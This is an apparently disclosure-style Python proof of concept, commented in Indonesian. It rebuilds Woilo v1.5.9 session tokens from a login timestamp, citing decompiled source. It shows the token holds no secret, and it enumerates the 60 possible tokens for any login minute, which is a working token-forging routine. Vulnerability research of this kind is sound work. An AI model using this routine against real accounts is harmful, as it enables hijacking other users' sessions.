#!/usr/bin/env python3
"""
POC: rekonstruksi session token (login_key) Woilo v1.5.9.

Sumber di dex:
  LoginActivityNew.java:224-262   -> pembangunan token
  h9.java:117-124                 -> jalur register, algoritma identik
  nd2.java:317  nd2.k(s)          -> Base64.encodeToString(s, 0)   [BUKAN hash]
  gl0.java:106  gl0.n(s)          -> new StringBuilder(s)          [identity]

Menunjukkan bahwa token sesi tidak mengandung secret apa pun: isinya hanya
timestamp, sehingga dapat dihitung ulang oleh siapa pun.

Offline. Tidak mengirim request ke server mana pun.
"""
import base64
from datetime import datetime

PREFIX = "HARDCODED_FCM_ID_"


def build_session_token(ts_ms: int) -> str:
    """Rekonstruksi persis login_key dari timestamp (jalur normal, bukan fallback Random)."""
    dt = datetime.fromtimestamp(ts_ms / 1000)
    # nd2.k(yyyy + MM + dd + HH + mm + iso)
    inner = base64.b64encode(
        (dt.strftime("%Y") + dt.strftime("%m") + dt.strftime("%d")
         + dt.strftime("%H") + dt.strftime("%M")
         + dt.strftime("%Y-%m-%dT%H:%M:%S")).encode()
    ).decode()
    s = PREFIX + inner
    # gl0.n(s) + reverse(s), lalu Base64
    return base64.b64encode((s + s[::-1]).encode()).decode()


def dissect(token: str) -> dict:
    """Bongkar token untuk memperlihatkan bahwa isinya hanya timestamp."""
    raw = base64.b64decode(token).decode()
    front = raw[: len(raw) // 2]
    assert front.startswith(PREFIX), "prefix tidak cocok"
    inner = base64.b64decode(front[len(PREFIX):]).decode()
    return {"prefix": PREFIX, "inner": inner, "doubled": raw == front + front[::-1]}


def candidates_for_minute(ts_ms: int) -> set:
    """Seluruh token yang mungkin untuk satu menit waktu login."""
    base = ts_ms - (ts_ms % 60_000)
    return {build_session_token(base + s * 1000) for s in range(60)}


def demo():
    ts = 1791122876504
    tok = build_session_token(ts)

    # 1. deterministik: timestamp sama -> token sama, tanpa secret
    assert build_session_token(ts) == tok, "token tidak deterministik"

    # 2. dapat dibongkar; isinya murni tanggal/waktu
    d = dissect(tok)
    assert d["doubled"], "struktur str+reverse(str) tidak cocok"
    assert d["inner"].startswith("2026100414"), f"inner bukan timestamp: {d['inner']}"

    # 3. ruang pencarian per menit sangat kecil
    cands = candidates_for_minute(ts)
    assert len(cands) <= 60, f"terlalu banyak kandidat: {len(cands)}"
    assert tok in cands, "token target tidak berada dalam rentang 1 menit"

    print("token          :", tok[:64], "...")
    print("prefix         :", d["prefix"])
    print("inner (Base64) :", d["inner"])
    print("struktur       : str + reverse(str), lalu Base64  ->", d["doubled"])
    print(f"kandidat/menit : {len(cands)}  (target termasuk: {tok in cands})")
    print("\nSEMUA CHECK LULUS - token sesi tidak mengandung entropy rahasia.")


if __name__ == "__main__":
    demo()
